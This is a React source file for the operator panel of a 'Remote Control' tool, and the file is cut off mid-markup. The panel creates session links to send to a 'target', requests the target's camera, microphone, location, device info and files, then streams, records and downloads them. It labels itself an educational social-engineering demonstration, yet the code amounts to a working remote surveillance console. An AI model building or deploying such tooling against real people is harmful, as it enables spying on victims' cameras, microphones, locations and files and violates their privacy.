import { useState, useEffect, useRef, useCallback } from "react";
import { useQuery, useMutation } from "@tanstack/react-query";
import { queryClient, apiRequest } from "@/lib/queryClient";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useToast } from "@/hooks/use-toast";
import {
  Wifi, WifiOff, Copy, Trash2, Plus, Camera, Mic, MapPin,
  Smartphone, FileText, Clock, AlertTriangle, Shield, Eye,
  CheckCircle2, XCircle, Monitor, Loader2, ExternalLink,
  Video, VideoOff, MicOff, Download, CameraIcon,
  Power, PowerOff, FolderOpen, Clipboard, Circle, Square,
} from "lucide-react";

interface RemoteSession {
  id: number;
  organizationId: number;
  sessionToken: string;
  name: string;
  status: string;
  permissionsGranted: string[] | null;
  deviceInfo: any;
  locationData: any;
  createdBy: string;
  createdAt: string;
  expiresAt: string;
  lastActivity: string | null;
}

type PermissionKey = "camera" | "microphone" | "location" | "deviceInfo" | "files";

interface PermissionStatus {
  status: "idle" | "requested" | "granted" | "denied";
}

export default function RemoteControlPage() {
  const { toast } = useToast();
  const [sessionName, setSessionName] = useState("");
  const [expiryMinutes, setExpiryMinutes] = useState("60");
  const [activeSessionToken, setActiveSessionToken] = useState<string | null>(null);
  const [targetConnected, setTargetConnected] = useState(false);
  const [liveDeviceInfo, setLiveDeviceInfo] = useState<any>(null);
  const [liveLocation, setLiveLocation] = useState<any>(null);
  const [liveFiles, setLiveFiles] = useState<any[]>([]);
  const [permissionStatuses, setPermissionStatuses] = useState<Record<PermissionKey, PermissionStatus>>({
    camera: { status: "idle" },
    microphone: { status: "idle" },
    location: { status: "idle" },
    deviceInfo: { status: "idle" },
    files: { status: "idle" },
  });
  const [cameraEnabled, setCameraEnabled] = useState(true);
  const [micEnabled, setMicEnabled] = useState(true);
  const [isRecordingVideo, setIsRecordingVideo] = useState(false);
  const [isRecordingAudio, setIsRecordingAudio] = useState(false);
  const [videoRecordTime, setVideoRecordTime] = useState(0);
  const [audioRecordTime, setAudioRecordTime] = useState(0);

  const wsRef = useRef<WebSocket | null>(null);
  const videoRef = useRef<HTMLVideoElement>(null);
  const peerRef = useRef<RTCPeerConnection | null>(null);
  const videoRecorderRef = useRef<MediaRecorder | null>(null);
  const audioRecorderRef = useRef<MediaRecorder | null>(null);
  const videoChunksRef = useRef<Blob[]>([]);
  const audioChunksRef = useRef<Blob[]>([]);
  const videoTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const audioTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const receivedStreamRef = useRef<MediaStream | null>(null);

  const { data: sessions = [], isLoading } = useQuery<RemoteSession[]>({
    queryKey: ["/api/remote-sessions"],
  });

  const createMutation = useMutation({
    mutationFn: async (data: { name: string; expiryMinutes: number }) => {
      const res = await apiRequest("POST", "/api/remote-sessions", data);
      return res.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/remote-sessions"] });
      setSessionName("");
      toast({ title: "Session created", description: "Share the generated link with the target." });
    },
  });

  const deleteMutation = useMutation({
    mutationFn: async (id: number) => {
      await apiRequest("DELETE", `/api/remote-sessions/${id}`);
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/remote-sessions"] });
      toast({ title: "Session deleted" });
    },
  });

  const sendToTarget = useCallback((msg: object) => {
    if (wsRef.current?.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify(msg));
    }
  }, []);

  const connectToSession = useCallback((token: string) => {
    if (wsRef.current) wsRef.current.close();
    setActiveSessionToken(token);
    setTargetConnected(false);
    setLiveDeviceInfo(null);
    setLiveLocation(null);
    setLiveFiles([]);
    setPermissionStatuses({
      camera: { status: "idle" },
      microphone: { status: "idle" },
      location: { status: "idle" },
      deviceInfo: { status: "idle" },
      files: { status: "idle" },
    });
    setCameraEnabled(true);
    setMicEnabled(true);

    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    const ws = new WebSocket(`${protocol}//${window.location.host}/ws`);
    wsRef.current = ws;

    ws.onopen = () => {
      ws.send(JSON.stringify({ type: "rc_operator", token }));
    };

    ws.onmessage = (event) => {
      try {
        const msg = JSON.parse(event.data);

        if (msg.type === "rc_target_connected") {
          setTargetConnected(true);
          queryClient.invalidateQueries({ queryKey: ["/api/remote-sessions"] });
        }

        if (msg.type === "rc_target_disconnected") {
          setTargetConnected(false);
        }

        if (msg.type === "rc_device_info") {
          setLiveDeviceInfo(msg.data);
        }

        if (msg.type === "rc_location") {
          setLiveLocation(msg.data);
        }

        if (msg.type === "rc_file") {
          setLiveFiles((prev) => [...prev, msg.data]);
        }

        if (msg.type === "rc_permission_granted" && msg.permission) {
          setPermissionStatuses((prev) => ({
            ...prev,
            [msg.permission]: { status: "granted" },
          }));
          toast({ title: `${msg.permission} access granted by target` });
        }

        if (msg.type === "rc_permission_denied" && msg.permission) {
          setPermissionStatuses((prev) => ({
            ...prev,
            [msg.permission]: { status: "denied" },
          }));
          toast({ title: `${msg.permission} access denied by target`, variant: "destructive" });
        }

        if (msg.type === "rc_track_toggled") {
          if (msg.track === "camera") setCameraEnabled(msg.enabled);
          if (msg.track === "microphone") setMicEnabled(msg.enabled);
        }

        if (msg.type === "rc_offer") {
          handleOffer(msg.sdp, ws);
        }

        if (msg.type === "rc_ice_candidate" && peerRef.current) {
          peerRef.current.addIceCandidate(new RTCIceCandidate(msg.candidate)).catch(() => {});
        }
      } catch {}
    };

    ws.onclose = () => {
      if (activeSessionToken === token) {
        setTargetConnected(false);
      }
    };
  }, [activeSessionToken, toast]);

  const handleOffer = async (sdp: RTCSessionDescriptionInit, ws: WebSocket) => {
    if (peerRef.current) peerRef.current.close();

    const pc = new RTCPeerConnection({
      iceServers: [{ urls: "stun:stun.l.google.com:19302" }],
    });
    peerRef.current = pc;

    pc.onicecandidate = (e) => {
      if (e.candidate && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ type: "rc_ice_candidate", candidate: e.candidate }));
      }
    };

    pc.ontrack = (e) => {
      if (e.streams[0]) {
        receivedStreamRef.current = e.streams[0];
        if (videoRef.current) {
          videoRef.current.srcObject = e.streams[0];
        }
      }
    };

    await pc.setRemoteDescription(new RTCSessionDescription(sdp));
    const answer = await pc.createAnswer();
    await pc.setLocalDescription(answer);

    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: "rc_answer", sdp: answer }));
    }
  };

  useEffect(() => {
    return () => {
      wsRef.current?.close();
      peerRef.current?.close();
      stopVideoRecording();
      stopAudioRecording();
    };
  }, []);

  const disconnectSession = () => {
    wsRef.current?.close();
    peerRef.current?.close();
    stopVideoRecording();
    stopAudioRecording();
    setActiveSessionToken(null);
    setTargetConnected(false);
    setLiveDeviceInfo(null);
    setLiveLocation(null);
    setLiveFiles([]);
    receivedStreamRef.current = null;
  };

  const requestPermission = (perm: PermissionKey) => {
    setPermissionStatuses((prev) => ({ ...prev, [perm]: { status: "requested" } }));
    sendToTarget({ type: "rc_request_permission", permission: perm });
    toast({ title: `Requesting ${perm} from target...` });
  };

  const toggleCamera = () => {
    const newState = !cameraEnabled;
    setCameraEnabled(newState);
    sendToTarget({ type: "rc_toggle_camera", enabled: newState });
    toast({ title: newState ? "Camera enabled" : "Camera disabled" });
  };

  const toggleMic = () => {
    const newState = !micEnabled;
    setMicEnabled(newState);
    sendToTarget({ type: "rc_toggle_mic", enabled: newState });
    toast({ title: newState ? "Microphone enabled" : "Microphone disabled" });
  };

  const takeScreenshot = () => {
    const video = videoRef.current;
    if (!video || !video.videoWidth) {
      toast({ title: "No video feed available", variant: "destructive" });
      return;
    }
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;
    ctx.drawImage(video, 0, 0);
    const link = document.createElement("a");
    link.download = `screenshot-${Date.now()}.png`;
    link.href = canvas.toDataURL("image/png");
    link.click();
    toast({ title: "Screenshot saved" });
  };

  const startVideoRecording = () => {
    const stream = receivedStreamRef.current;
    if (!stream) {
      toast({ title: "No video stream available", variant: "destructive" });
      return;
    }
    videoChunksRef.current = [];
    try {
      const recorder = new MediaRecorder(stream, { mimeType: "video/webm;codecs=vp9,opus" });
      recorder.ondataavailable = (e) => {
        if (e.data.size > 0) videoChunksRef.current.push(e.data);
      };
      recorder.onstop = () => {
        const blob = new Blob(videoChunksRef.current, { type: "video/webm" });
        const link = document.createElement("a");
        link.download = `recording-${Date.now()}.webm`;
        link.href = URL.createObjectURL(blob);
        link.click();
        URL.revokeObjectURL(link.href);
        toast({ title: "Video recording saved" });
      };
      recorder.start(1000);
      videoRecorderRef.current = recorder;
      setIsRecordingVideo(true);
      setVideoRecordTime(0);
      videoTimerRef.current = setInterval(() => setVideoRecordTime((t) => t + 1), 1000);
    } catch {
      toast({ title: "Recording not supported in this browser", variant: "destructive" });
    }
  };

  const stopVideoRecording = () => {
    if (videoRecorderRef.current && videoRecorderRef.current.state !== "inactive") {
      videoRecorderRef.current.stop();
    }
    videoRecorderRef.current = null;
    setIsRecordingVideo(false);
    if (videoTimerRef.current) clearInterval(videoTimerRef.current);
    videoTimerRef.current = null;
  };

  const startAudioRecording = () => {
    const stream = receivedStreamRef.current;
    if (!stream) {
      toast({ title: "No audio stream available", variant: "destructive" });
      return;
    }
    const audioTracks = stream.getAudioTracks();
    if (audioTracks.length === 0) {
      toast({ title: "No audio track in stream", variant: "destructive" });
      return;
    }
    const audioStream = new MediaStream(audioTracks);
    audioChunksRef.current = [];
    try {
      const recorder = new MediaRecorder(audioStream, { mimeType: "audio/webm;codecs=opus" });
      recorder.ondataavailable = (e) => {
        if (e.data.size > 0) audioChunksRef.current.push(e.data);
      };
      recorder.onstop = () => {
        const blob = new Blob(audioChunksRef.current, { type: "audio/webm" });
        const link = document.createElement("a");
        link.download = `audio-${Date.now()}.webm`;
        link.href = URL.createObjectURL(blob);
        link.click();
        URL.revokeObjectURL(link.href);
        toast({ title: "Audio recording saved" });
      };
      recorder.start(1000);
      audioRecorderRef.current = recorder;
      setIsRecordingAudio(true);
      setAudioRecordTime(0);
      audioTimerRef.current = setInterval(() => setAudioRecordTime((t) => t + 1), 1000);
    } catch {
      toast({ title: "Audio recording not supported", variant: "destructive" });
    }
  };

  const stopAudioRecording = () => {
    if (audioRecorderRef.current && audioRecorderRef.current.state !== "inactive") {
      audioRecorderRef.current.stop();
    }
    audioRecorderRef.current = null;
    setIsRecordingAudio(false);
    if (audioTimerRef.current) clearInterval(audioTimerRef.current);
    audioTimerRef.current = null;
  };

  const copyDeviceInfo = () => {
    if (!liveDeviceInfo) return;
    navigator.clipboard.writeText(JSON.stringify(liveDeviceInfo, null, 2));
    toast({ title: "Device info copied to clipboard" });
  };

  const copyLocation = () => {
    if (!liveLocation) return;
    navigator.clipboard.writeText(
      `Lat: ${liveLocation.latitude}, Lng: ${liveLocation.longitude}, Accuracy: ${liveLocation.accuracy}m`
    );
    toast({ title: "Location data copied to clipboard" });
  };

  const downloadFile = (file: any) => {
    if (!file.preview) return;
    const link = document.createElement("a");
    link.download = file.name;
    link.href = file.preview;
    link.click();
    toast({ title: `Downloading ${file.name}` });
  };

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60).toString().padStart(2, "0");
    const s = (seconds % 60).toString().padStart(2, "0");
    return `${m}:${s}`;
  };

  const getSessionLink = (token: string) => `${window.location.origin}/rc/${token}`;

  const copyLink = (token: string) => {
    navigator.clipboard.writeText(getSessionLink(token));
    toast({ title: "Link copied to clipboard" });
  };

  const getStatusBadge = (status: string) => {
    switch (status) {
      case "active":
        return <Badge className="bg-green-500/20 text-green-400 border-green-500/30" data-testid="badge-status-active">Active</Badge>;
      case "pending":
        return <Badge className="bg-yellow-500/20 text-yellow-400 border-yellow-500/30" data-testid="badge-status-pending">Pending</Badge>;
      case "expired":
        return <Badge className="bg-red-500/20 text-red-400 border-red-500/30" data-testid="badge-status-expired">Expired</Badge>;
      case "closed":
        return <Badge className="bg-gray-500/20 text-gray-400 border-gray-500/30" data-testid="badge-status-closed">Closed</Badge>;
      default:
        return <Badge variant="secondary">{status}</Badge>;
    }
  };

  const getPermBadge = (status: PermissionStatus["status"]) => {
    switch (status) {
      case "granted":
        return <Badge className="bg-green-500/20 text-green-400 border-green-500/30 text-[10px]"><CheckCircle2 className="w-3 h-3 mr-0.5" />Granted</Badge>;
      case "denied":
        return <Badge className="bg-red-500/20 text-red-400 border-red-500/30 text-[10px]"><XCircle className="w-3 h-3 mr-0.5" />Denied</Badge>;
      case "requested":
        return <Badge className="bg-yellow-500/20 text-yellow-400 border-yellow-500/30 text-[10px]"><Loader2 className="w-3 h-3 mr-0.5 animate-spin" />Requested</Badge>;
      default:
        return <Badge className="bg-gray-500/20 text-gray-400 border-gray-500/30 text-[10px]">Not Requested</Badge>;
    }
  };

  const permissionItems: { key: PermissionKey; label: string; icon: typeof Camera }[] = [
    { key: "camera", label: "Camera", icon: Camera },
    { key: "microphone", label: "Microphone", icon: Mic },
    { key: "location", label: "Location", icon: MapPin },
    { key: "deviceInfo", label: "Device Info", icon: Smartphone },
    { key: "files", label: "Files", icon: FolderOpen },
  ];

  return (
    <div className="p-4 sm:p-6 space-y-6 max-w-7xl mx-auto">
      <div className="flex items-center gap-3">
        <div className="flex items-center justify-center w-10 h-10 rounded-lg bg-red-500/10 border border-red-500/20">
          <Eye className="w-5 h-5 text-red-400" />
        </div>
        <div>
          <h1 className="text-xl font-bold" data-testid="text-page-title">Remote Control</h1>
          <p className="text-xs text-muted-foreground">Educational cybersecurity remote access demonstration</p>
        </div>
      </div>

      <Card className="border-yellow-500/30 bg-yellow-500/5">
        <CardContent className="p-4 flex items-start gap-3">
          <AlertTriangle className="w-5 h-5 text-yellow-400 flex-shrink-0 mt-0.5" />
          <div className="text-sm">
            <p className="font-medium text-yellow-400">Educational Tool</p>
            <p className="text-muted-foreground text-xs mt-1">
              This tool demonstrates how attackers gain access to devices through social engineering.
              All access requires explicit browser permission prompts from the target.
              Use only for authorized cybersecurity training and awareness.
            </p>
          </div>
        </CardContent>
      </Card>

      <div className="grid gap-6 lg:grid-cols-2">
        <Card>
          <CardHeader className="pb-3">
            <CardTitle className="text-sm flex items-center gap-2">
              <Plus className="w-4 h-4" />
              Create New Session
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-3">
            <Input
              placeholder="Session name (e.g., Training Demo 1)"
              value={sessionName}
              onChange={(e) => setSessionName(e.target.value)}
              data-testid="input-session-name"
            />
            <div className="flex gap-2">
              <Select value={expiryMinutes} onValueChange={setExpiryMinutes}>
                <SelectTrigger className="w-full" data-testid="select-expiry">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="15">15 minutes</SelectItem>
                  <SelectItem value="30">30 minutes</SelectItem>
                  <SelectItem value="60">1 hour</SelectItem>
                  <SelectItem value="120">2 hours</SelectItem>
                  <SelectItem value="480">8 hours</SelectItem>
                  <SelectItem value="1440">24 hours</SelectItem>
                </SelectContent>
              </Select>
              <Button
                onClick={() => createMutation.mutate({ name: sessionName, expiryMinutes: parseInt(expiryMinutes) })}
                disabled={!sessionName.trim() || createMutation.isPending}
                data-testid="button-create-session"
              >
                {createMutation.isPending ? <Loader2 className="w-4 h-4 animate-spin" /> : <Plus className="w-4 h-4" />}
                <span className="ml-1">Create</span>
              </Button>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="pb-3">
            <CardTitle className="text-sm flex items-center gap-2">
              <Shield className="w-4 h-4" />
              How It Works
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-2 text-xs text-muted-foreground">
            <div className="flex gap-2"><span className="font-mono text-primary">1.</span><span>Create a session and copy the generated link</span></div>
            <div className="flex gap-2"><span className="font-mono text-primary">2.</span><span>Share the link with the target (e.g., via email or message)</span></div>
            <div className="flex gap-2"><span className="font-mono text-primary">3.</span><span>Connect to the session and request permissions remotely</span></div>
            <div className="flex gap-2"><span className="font-mono text-primary">4.</span><span>The target sees a popup and browser prompt for each request</span></div>
            <div className="flex gap-2"><span className="font-mono text-primary">5.</span><span>Control camera/mic, record video/audio, take screenshots</span></div>
          </CardContent>
        </Card>
      </div>

      <Card>
        <CardHeader className="pb-3">
          <CardTitle className="text-sm flex items-center gap-2">
            <Monitor className="w-4 h-4" />
            Sessions ({sessions.length})
          </CardTitle>
        </CardHeader>
        <CardContent>
          {isLoading ? (
            <div className="flex justify-center py-8"><Loader2 className="w-6 h-6 animate-spin text-muted-foreground" /></div>
          ) : sessions.length === 0 ? (
            <p className="text-center text-sm text-muted-foreground py-8">No sessions yet. Create one above.</p>
          ) : (
            <div className="space-y-2">
              {sessions.map((session) => (
                <div
                  key={session.id}
                  className={`flex flex-col sm:flex-row sm:items-center gap-2 sm:gap-4 p-3 rounded-lg border transition-colors ${
                    activeSessionToken === session.sessionToken ? "border-primary/50 bg-primary/5" : "border-border/50 hover:border-border"
                  }`}
                  data-testid={`session-row-${session.id}`}
                >
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2">
                      <span className="text-sm font-medium truncate" data-testid={`text-session-name-${session.id}`}>{session.name}</span>
                      {getStatusBadge(session.status)}
                    </div>
                    <div className="flex items-center gap-3 mt-1 text-[10px] text-muted-foreground">
                      <span className="flex items-center gap-1"><Clock className="w-3 h-3" />Expires {new Date(session.expiresAt).toLocaleString()}</span>
                    </div>
                  </div>
                  <div className="flex items-center gap-1 flex-shrink-0">
                    <Button size="sm" variant="ghost" className="h-7 text-xs" onClick={() => copyLink(session.sessionToken)} data-testid={`button-copy-link-${session.id}`}>
                      <Copy className="w-3 h-3 mr-1" /> Copy Link
                    </Button>
                    {activeSessionToken === session.sessionToken ? (
                      <Button size="sm" variant="outline" className="h-7 text-xs border-red-500/30 text-red-400" onClick={disconnectSession} data-testid={`button-disconnect-${session.id}`}>
                        <WifiOff className="w-3 h-3 mr-1" /> Disconnect
                      </Button>
                    ) : (
                      <Button size="sm" variant="outline" className="h-7 text-xs" onClick={() => connectToSession(session.sessionToken)} disabled={session.status === "expired" || session.status === "closed"} data-testid={`button-connect-${session.id}`}>
                        <Wifi className="w-3 h-3 mr-1" /> Monitor
                      </Button>
                    )}
                    <Button size="sm" variant="ghost" className="h-7 w-7 p-0 text-red-400 hover:text-red-300" onClick={() => deleteMutation.mutate(session.id)} data-testid={`button-delete-${session.id}`}>
                      <Trash2 className="w-3 h-3" />
                    </Button>
                  </div>
                </div>
              ))}
            </div>
          )}
        </CardContent>
      </Card>

      {activeSessionToken && (
        <div className="space-y-4">
          <div className="flex items-center gap-2">
            <h2 className="text-lg font-semibold">Live Session Monitor</h2>
            {targetConnected ? (
              <Badge className="bg-green-500/20 text-green-400 border-green-500/30 animate-pulse">
                <Wifi className="w-3 h-3 mr-1" /> Target Connected
              </Badge>
            ) : (
              <Badge className="bg-gray-500/20 text-gray-400 border-gray-500/30">
                <WifiOff className="w-3 h-3 mr-1" /> Waiting for target...
              </Badge>
            )}
          </div>

          {!targetConnected && (
            <Card className="border-dashed">
              <CardContent className="p-8 text-center space-y-3">
                <Loader2 className="w-8 h-8 animate-spin text-muted-foreground mx-auto" />
                <p className="text-sm text-muted-foreground">Waiting for target to open the link...</p>
                <div className="flex items-center justify-center gap-2">
                  <code className="text-xs bg-muted px-2 py-1 rounded max-w-md truncate" data-testid="text-session-link">{getSessionLink(activeSessionToken)}</code>
                  <Button size="sm" variant="ghost" className="h-6" onClick={() => copyLink(activeSessionToken)} data-testid="button-copy-active-link">
                    <Copy className="w-3 h-3" />
                  </Button>
                </div>
              </CardContent>
            </Card>
          )}

          {targetConnected && (
            <div className="space-y-4">
              <Card className="border-primary/20">
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm flex items-center gap-2">
                    <Power className="w-4 h-4 text-primary" />
                    Remote Access Control
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="grid gap-3 sm:grid-cols-2 lg:grid-cols-5">
                    {permissionItems.map((item) => {
                      const status = permissionStatuses[item.key].status;
                      const Icon = item.icon;
                      return (
                        <div key={item.key} className="flex flex-col items-center gap-2 p-3 rounded-lg border border-border/50 bg-muted/20" data-testid={`control-perm-${item.key}`}>
                          <Icon className="w-5 h-5 text-muted-foreground" />
                          <span className="text-xs font-medium">{item.label}</span>
                          {getPermBadge(status)}
                          <Button
                            size="sm"
                            variant={status === "granted" ? "secondary" : "default"}
                            className="h-7 text-[10px] w-full"
                            onClick={() => requestPermission(item.key)}
                            disabled={status === "granted" || status === "requested"}
                            data-testid={`button-request-${item.key}`}
                          >
                            {status === "granted" ? "Accessed" : status === "requested" ? "Pending..." : "Request Access"}
                          </Button>
                        </div>
                      );
                    })}
                  </div>

                  {(permissionStatuses.camera.status === "granted" || permissionStatuses.microphone.status === "granted") && (
                    <div className="flex items-center gap-2 mt-4 pt-4 border-t border-border/30">
                      <span className="text-xs text-muted-foreground font-medium mr-2">Stream Control:</span>
                      {permissionStatuses.camera.status === "granted" && (
                        <Button
                          size="sm"
                          variant={cameraEnabled ? "default" : "destructive"}
                          className="h-7 text-xs"
                          onClick={toggleCamera}
                          data-testid="button-toggle-camera"
                        >
                          {cameraEnabled ? <><Video className="w-3 h-3 mr-1" />Camera On</> : <><VideoOff className="w-3 h-3 mr-1" />Camera Off</>}
                        </Button>
                      )}
                      {permissionStatuses.microphone.status === "granted" && (
                        <Button
                          size="sm"
                          variant={micEnabled ? "default" : "destructive"}
                          className="h-7 text-xs"
                          onClick={toggleMic}
                          data-testid="button-toggle-mic"
                        >
                          {micEnabled ? <><Mic className="w-3 h-3 mr-1" />Mic On</> : <><MicOff className="w-3 h-3 mr-1" />Mic Off</>}
                        </Button>
                      )}
                    </div>
                  )}
                </CardContent>
              </Card>

              <div className="grid gap-4 md:grid-cols-2">
                <Card>
                  <CardHeader className="pb-2">
                    <CardTitle className="text-sm flex items-center justify-between">
                      <span className="flex items-center gap-2">
                        <Camera className="w-4 h-4 text-blue-400" />
                        Camera Feed
                      </span>
                      <div className="flex items-center gap-1">
                        <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={takeScreenshot} data-testid="button-screenshot">
                          <CameraIcon className="w-3 h-3 mr-1" />Screenshot
                        </Button>
                        {isRecordingVideo ? (
                          <Button size="sm" variant="destructive" className="h-6 px-2 text-[10px]" onClick={stopVideoRecording} data-testid="button-stop-video-record">
                            <Square className="w-3 h-3 mr-1" />{formatTime(videoRecordTime)}
                          </Button>
                        ) : (
                          <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={startVideoRecording} data-testid="button-start-video-record">
                            <Circle className="w-3 h-3 mr-1 text-red-400" />Record
                          </Button>
                        )}
                      </div>
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="aspect-video bg-black rounded-lg overflow-hidden relative">
                      <video
                        ref={videoRef}
                        autoPlay
                        playsInline
                        className="w-full h-full object-cover"
                        data-testid="video-camera-feed"
                      />
                      <div className="absolute bottom-2 left-2 flex items-center gap-1">
                        <Badge className="bg-red-500/80 text-white border-0 text-[10px]">LIVE</Badge>
                        {!cameraEnabled && <Badge className="bg-gray-800/80 text-gray-300 border-0 text-[10px]">Camera Off</Badge>}
                      </div>
                      {isRecordingVideo && (
                        <div className="absolute top-2 right-2">
                          <Badge className="bg-red-600 text-white border-0 text-[10px] animate-pulse">
                            <Circle className="w-2 h-2 mr-1 fill-current" />REC {formatTime(videoRecordTime)}
                          </Badge>
                        </div>
                      )}
                    </div>
                  </CardContent>
                </Card>

                <Card>
                  <CardHeader className="pb-2">
                    <CardTitle className="text-sm flex items-center justify-between">
                      <span className="flex items-center gap-2">
                        <Mic className="w-4 h-4 text-green-400" />
                        Audio Stream
                      </span>
                      <div className="flex items-center gap-1">
                        {isRecordingAudio ? (
                          <Button size="sm" variant="destructive" className="h-6 px-2 text-[10px]" onClick={stopAudioRecording} data-testid="button-stop-audio-record">
                            <Square className="w-3 h-3 mr-1" />{formatTime(audioRecordTime)}
                          </Button>
                        ) : (
                          <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={startAudioRecording} data-testid="button-start-audio-record">
                            <Circle className="w-3 h-3 mr-1 text-red-400" />Record Audio
                          </Button>
                        )}
                      </div>
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="aspect-video bg-muted/30 rounded-lg flex items-center justify-center relative">
                      <div className="text-center space-y-2">
                        {micEnabled ? (
                          <Mic className="w-8 h-8 text-green-400 mx-auto animate-pulse" />
                        ) : (
                          <MicOff className="w-8 h-8 text-red-400 mx-auto" />
                        )}
                        <p className="text-xs text-muted-foreground">
                          {micEnabled ? "Audio is streaming live (plays through video element)" : "Microphone is currently disabled"}
                        </p>
                        {!micEnabled && <Badge className="bg-gray-800/80 text-gray-300 border-0 text-[10px]">Mic Off</Badge>}
                      </div>
                      {isRecordingAudio && (
                        <div className="absolute top-2 right-2">
                          <Badge className="bg-red-600 text-white border-0 text-[10px] animate-pulse">
                            <Circle className="w-2 h-2 mr-1 fill-current" />REC {formatTime(audioRecordTime)}
                          </Badge>
                        </div>
                      )}
                    </div>
                  </CardContent>
                </Card>

                <Card>
                  <CardHeader className="pb-2">
                    <CardTitle className="text-sm flex items-center justify-between">
                      <span className="flex items-center gap-2">
                        <MapPin className="w-4 h-4 text-red-400" />
                        Location Data
                      </span>
                      {liveLocation && (
                        <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={copyLocation} data-testid="button-copy-location">
                          <Clipboard className="w-3 h-3 mr-1" />Copy
                        </Button>
                      )}
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    {liveLocation ? (
                      <div className="space-y-2">
                        <div className="grid grid-cols-2 gap-2 text-xs">
                          <div className="bg-muted/30 p-2 rounded">
                            <span className="text-muted-foreground">Latitude</span>
                            <p className="font-mono" data-testid="text-latitude">{liveLocation.latitude?.toFixed(6)}</p>
                          </div>
                          <div className="bg-muted/30 p-2 rounded">
                            <span className="text-muted-foreground">Longitude</span>
                            <p className="font-mono" data-testid="text-longitude">{liveLocation.longitude?.toFixed(6)}</p>
                          </div>
                          <div className="bg-muted/30 p-2 rounded">
                            <span className="text-muted-foreground">Accuracy</span>
                            <p className="font-mono">{liveLocation.accuracy?.toFixed(0)}m</p>
                          </div>
                          <div className="bg-muted/30 p-2 rounded">
                            <span className="text-muted-foreground">Altitude</span>
                            <p className="font-mono">{liveLocation.altitude?.toFixed(1) || "N/A"}m</p>
                          </div>
                        </div>
                        <a
                          href={`https://www.google.com/maps?q=${liveLocation.latitude},${liveLocation.longitude}`}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="flex items-center gap-1 text-xs text-primary hover:underline"
                          data-testid="link-view-map"
                        >
                          <ExternalLink className="w-3 h-3" /> View on Google Maps
                        </a>
                      </div>
                    ) : (
                      <div className="flex items-center justify-center h-24 text-xs text-muted-foreground">
                        Waiting for location data...
                      </div>
                    )}
                  </CardContent>
                </Card>

                <Card>
                  <CardHeader className="pb-2">
                    <CardTitle className="text-sm flex items-center justify-between">
                      <span className="flex items-center gap-2">
                        <Smartphone className="w-4 h-4 text-purple-400" />
                        Device Information
                      </span>
                      {liveDeviceInfo && (
                        <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={copyDeviceInfo} data-testid="button-copy-device-info">
                          <Clipboard className="w-3 h-3 mr-1" />Copy JSON
                        </Button>
                      )}
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    {liveDeviceInfo ? (
                      <div className="space-y-1.5 text-xs max-h-64 overflow-y-auto">
                        {Object.entries(liveDeviceInfo).map(([key, value]) => (
                          <div key={key} className="flex justify-between items-center py-1 border-b border-border/30 last:border-0">
                            <span className="text-muted-foreground capitalize">{key.replace(/([A-Z])/g, " $1").trim()}</span>
                            <span className="font-mono text-right max-w-[60%] truncate" data-testid={`text-device-${key}`}>
                              {typeof value === "object" ? JSON.stringify(value) : String(value)}
                            </span>
                          </div>
                        ))}
                      </div>
                    ) : (
                      <div className="flex items-center justify-center h-24 text-xs text-muted-foreground">
                        Waiting for device info...
                      </div>
                    )}
                  </CardContent>
                </Card>

                <Card className="md:col-span-2">
                  <CardHeader className="pb-2">
                    <CardTitle className="text-sm flex items-center gap-2">
                      <FileText className="w-4 h-4 text-orange-400" />
                      Files Received ({liveFiles.length})
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    {liveFiles.length > 0 ? (
                      <div className="grid gap-2 sm:grid-cols-2 lg:grid-cols-3">
                        {liveFiles.map((file, i) => (
                          <div key={i} className="flex items-center gap-2 p-2 rounded-lg bg-muted/30 border border-border/30" data-testid={`file-item-${i}`}>
                            {file.preview && file.type?.startsWith("image/") ? (
                              <img src={file.preview} alt={file.name} className="w-10 h-10 rounded object-cover" />
                            ) : (
                              <div className="w-10 h-10 rounded bg-muted flex items-center justify-center">
                                <FileText className="w-5 h-5 text-muted-foreground" />
                              </div>
                            )}
                            <div className="flex-1 min-w-0">
                              <p className="text-xs font-medium truncate">{file.name}</p>
                              <p className="text-[10px] text-muted-foreground">{file.type} - {(file.size / 1024).toFixed(1)} KB</p>
                            </div>
                            <Button size="sm" variant="ghost" className="h-6 w-6 p-0" onClick={() => downloadFile(file)} data-testid={`button-download-file-${i}`}>
                              <Download className="w-3 h-3" />
                            </Button>
                          </div>
                        ))}
                      </div>
                    ) : (
                      <div className="flex items-center justify-center h-16 text-xs text-muted-foreground">
                        No files received yet
                      </div>
                    )}
                  </CardContent>
                </Card>
              </div>
            </div>
          )}
        </div>
      )}

